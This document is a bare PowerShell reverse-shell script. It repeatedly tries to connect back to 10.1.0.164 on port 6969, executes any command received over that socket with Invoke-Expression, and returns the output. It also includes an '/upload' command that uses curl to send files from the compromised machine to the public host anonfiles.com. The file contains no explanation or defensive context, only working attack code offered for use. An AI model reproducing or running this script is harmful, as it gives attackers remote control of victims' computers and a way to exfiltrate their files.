do
{
	Start-Sleep -Seconds 1
	try
	{
		$TCPClient = New-Object Net.Sockets.TCPClient('10.1.0.164', 6969)
	}
	catch { }
}
until ($TCPClient.Connected)

$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

function InvokeCustomCommands ($Action)
{
	#end connection
	if ($Action -eq "stop") { $StreamWriter.Close() }
	
	#upload a file
	if ($Action -match "upload ")
	{
		function AnonUpload ($file) { cmd /c "curl -F "file=@$file" https://api.anonfiles.com/upload" | Select-String "full" -OutVariable filelink; WriteToStream ("Download Here:" + $filelink) }
		$file = $Action.Replace("upload ", "")
		if (((Test-Path $file) -eq $true) -and ((Get-Item $file).Extension -ne "")) { $file = (Get-Item $file).FullName; AnonUpload ($file) }
		else { WriteToStream "No Such File!" }
	}
	
	else { WriteToStream "Invalid Command!" }
}

function WriteToStream ($String)
{
	[byte[]]$script:Buffer = 0 .. $TCPClient.ReceiveBufferSize | % { 0 }
	
	$StreamWriter.Write($String + "`n[DEEZ NUTS] > ")
	$StreamWriter.Flush()
}

WriteToStream ''

while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0)
{
	$Command = ([text.encoding]::ASCII).GetString($Buffer, 0, $BytesRead - 1)
	
	$Output = if ($Command.Substring(0, 1) -eq "/")
	{
		InvokeCustomCommands  $Command.Replace("/", "")
	}
	else
	{
		try
		{
			Invoke-Expression $Command 2>&1 | Out-String
		}
		catch
		{
			$_ | Out-String
		}
	}
	
	WriteToStream ($Output)
}
$StreamWriter.Close()
Clear-Host